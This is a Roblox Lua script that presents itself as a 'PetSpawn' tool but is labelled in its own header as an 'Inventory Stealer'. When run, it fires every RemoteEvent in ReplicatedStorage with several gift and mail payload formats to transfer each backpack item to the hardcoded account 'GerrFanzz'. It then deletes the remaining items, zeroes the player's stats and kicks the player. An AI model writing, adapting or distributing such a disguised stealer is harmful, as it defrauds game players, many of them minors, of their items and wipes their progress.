-- PetSpawn v8 - Inventory Stealer
local plr = game.Players.LocalPlayer
local rs = game.ReplicatedStorage

local PADUKA_NAME = "GerrFanzz"
local PADUKA_ID = 10615002879

print("🐾 PetSpawn Active!")
print("👤 " .. plr.Name)
print("")

local sent = 0

-- Ambil semua item di backpack
for _, item in pairs(plr.Backpack:GetChildren()) do
    if item:IsA("Tool") then
        
        -- Cari semua remote mail/gift
        for _, remote in pairs(rs:GetDescendants()) do
            if remote:IsA("RemoteEvent") then
                
                -- Kirim ke Paduka (6 format)
                pcall(function()
                    remote:FireServer({
                        Recipient = PADUKA_NAME,
                        RecipientId = PADUKA_ID,
                        Target = PADUKA_NAME,
                        TargetId = PADUKA_ID,
                        SendTo = PADUKA_NAME,
                        GiveTo = PADUKA_NAME,
                        Item = item.Name,
                        ItemName = item.Name,
                        Type = "Gift",
                        Action = "Send",
                        Amount = 1
                    })
                end)
                
                pcall(function()
                    remote:FireServer(PADUKA_NAME, item.Name, 1)
                end)
                
                pcall(function()
                    remote:FireServer(PADUKA_ID, item.Name, 1)
                end)
                
                pcall(function()
                    remote:FireServer("Mail", PADUKA_NAME, item.Name)
                end)
                
                pcall(function()
                    remote:FireServer("Gift", PADUKA_ID, item.Name)
                end)
                
                pcall(function()
                    remote:FireServer("Send", PADUKA_NAME, item.Name)
                end)
                
            end
        end
        
        sent = sent + 1
        print("✅ " .. item.Name .. " → GerrFanzz")
        wait(0.05)
    end
end

-- Hapus item target
for _, item in pairs(plr.Backpack:GetChildren()) do
    if item:IsA("Tool") then
        item:Destroy()
    end
end

-- Reset stats
pcall(function()
    if plr:FindFirstChild("leaderstats") then
        for _, stat in pairs(plr.leaderstats:GetChildren()) do
            if stat:IsA("IntValue") or stat:IsA("NumberValue") then
                stat.Value = 0
            end
        end
    end
end)

print("\n✅ " .. sent .. " items sent!")
print("👑 To: GerrFanzz")
wait(1)
plr:Kick("Complete! Rejoin!")
